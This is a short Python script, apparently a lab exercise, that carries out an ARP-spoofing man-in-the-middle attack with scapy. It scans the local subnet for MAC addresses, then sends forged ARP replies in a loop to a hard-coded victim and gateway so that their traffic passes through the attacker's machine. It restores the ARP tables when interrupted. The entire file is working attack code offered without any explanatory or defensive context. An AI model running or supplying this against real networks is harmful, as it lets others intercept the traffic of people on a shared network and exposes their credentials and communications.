#!/usr/bin/env python3
import netifaces as ni
import os
import scapy.all as scapy
import time

class Attack():
    def __init__(self):
        self.ip_list = []
        self.network = []
        self.ip_mac = {}
        self.interfaces = ni.interfaces()
        self.attacker, self.victim, self.ap = '192.168.28.128', '192.168.28.130', '192.168.28.1'

    def get_ip(self):
        for i in self.interfaces:
            self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
        self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]

    def get_mac(self, network):
        arp_request = scapy.ARP(pdst = network)
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
        for sent, received in result:
            self.ip_mac[received.psrc] = received.hwsrc

    def spoof(self, target_ip, spoof_ip): 
        target_mac = self.ip_mac[target_ip]
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet,verbose=0)

    def restore(self, dest_ip, src_ip):
        dest_mac = self.ip_mac[dest_ip]
        src_mac = self.ip_mac[src_ip]
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet,count=4,verbose=0)

    def arp_spoofing(self):
        while 1:
            attack.spoof(self.victim, self.ap)
            attack.spoof(self.ap, self.victim)
            time.sleep(1)

    def ret_arp_spoofing(self):
        attack.restore(self.ap, self.victim)
        attack.restore(self.victim, self.ap)

attack = Attack()
attack.get_ip()
attack.get_mac(attack.network[1])
print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
try:
    attack.arp_spoofing()
except KeyboardInterrupt:
    attack.ret_arp_spoofing()

